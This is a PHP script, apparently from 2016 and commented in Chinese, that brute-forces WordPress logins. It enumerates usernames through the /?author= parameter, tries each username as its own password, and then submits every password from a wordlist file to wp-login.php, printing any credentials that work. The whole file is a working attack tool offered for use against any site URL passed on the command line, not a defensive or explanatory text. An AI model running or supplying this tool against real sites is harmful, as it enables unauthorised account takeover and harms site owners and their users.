<?php

function title(){
echo "
\t########### 爆破 WordPress用户密码 ##############
\t#  [*]通过URL/?author= 遍历获取用户名           #
\t#  [*]先跑用户名与密码相同的用户                #
\t#  [*]调用同目录下pass.txt中的密码文件进行爆破  #   
\t#     Author By vforbox, 2016,4\t\t             #
\t#################################################\n\n
";
}

if($argc<=2){
help();
exit;
}

title();
// 无限制持续运行,php.ini中将safe_mode = Off
set_time_limit(0); 
$domain = $argv[1];
 
//获取用户名
for ($i=1; $i <= 10; $i++) {
 
    $url = $domain."/?author=".$i;
    $response = httprequest($url,0);
    if ($response == 404) {
        continue;
    }
    $pattern = "{<title>(.*) \|}";
    preg_match($pattern, $response, $name);
    $namearray[] = $name[1];
   if($namearray==""){
        $namearray[0] = "admin";
  }
 }

echo "[*]获取用户...\n";
echo "[+]用户名: ".$namearray[0]."\n";
echo "[*]正在破解用户名与密码相同的用户...\n";

$crackname = crackpassword($namearray,"same");
if ($crackname == ''){
    echo "[-]没有找到用户名与密码相同的用户\n";
}

$passwords = file($argv[2]);
 
echo "[*]加载字典破解弱口令用户...\n";
 
if ($crackname) {
    $namearray = array_diff($namearray,$crackname);
}
 
crackpassword($namearray,$passwords);
 
function crackpassword($namearray,$passwords){
    global $domain;
    $crackname = "";
    foreach ($namearray as $name) {
        $url = $domain."/wp-login.php";
        if ($passwords == "same") {
            $post = "log=".urlencode($name)."&pwd=".urlencode($name)."&wp-submit=%E7%99%BB%E5%BD%95&redirect_to=".urlencode($domain)."%2Fwp-admin%2F&testcookie=1";
            $pos = strpos(httprequest($url,$post),'div id="login_error"');
           // 恒等于,如果 $post 等于 false，且它们类型相同，则返回 true
            if ($pos === false) {
                echo "[+]用户名: ".$name. " 密码: ".$name."\n";
                $crackname[] = $name;
            }
        }else{
        $b=1;
            foreach ($passwords as $pass) {
        $pass=str_replace(array("\n","\r"),"",$pass);
                $post = "log=".urlencode($name)."&pwd=".urlencode($pass)."&wp-submit=%E7%99%BB%E5%BD%95&redirect_to=".urlencode($domain)."%2Fwp-admin%2F&testcookie=1";
                $pos = strpos(httprequest($url,$post),'div id="login_error"');
                echo "[-]正在尝试第[".$b++."]个密码: ".$pass."\n";
                if ($pos === false) {
                    echo "[+]用户名: ".$name." 密码: ".$pass."\n";
            break;
                }
            }
        }
    }
    return $crackname;
}

function help(){
    echo "

    \t\t┃┃┃┃
    \t\t┃┃┃┃
    \t\t┃┃┃┃
    \t\t╰╮╭╯
    \t\t ╰╯　
     \n";
    echo "\tAuthor By vforbox, 2016 4\n\n";
    echo "Usage:\n";
    echo "\t<-h | -help>     - 帮助\n";
    echo "\t<URL PassFile>   - 爆破\n\n";
    echo "Examples:\n";
    echo "\tphp wordpress.php http://domain.com pass.txt\n";
}
 
function httprequest($url,$post){
    $cookie = dirname(__FILE__).'/cookie1.txt';; //取cookie的值
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_URL, "$url"); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
    curl_setopt ( $ch, CURLOPT_COOKIEFILE, $cookie ); //读取上面所储存的Cookie信息

   if($post){
        curl_setopt($ch, CURLOPT_POST, 1); //post提交方式
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }

    curl_setopt ( $ch, CURLOPT_TIMEOUT, 30 ); 
    $output = curl_exec($ch); 
    $httpcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
    curl_close($ch);
 
 
    if ($httpcode == 404) {
        return 404;
    }else{
        return $output;
    }
}
?>
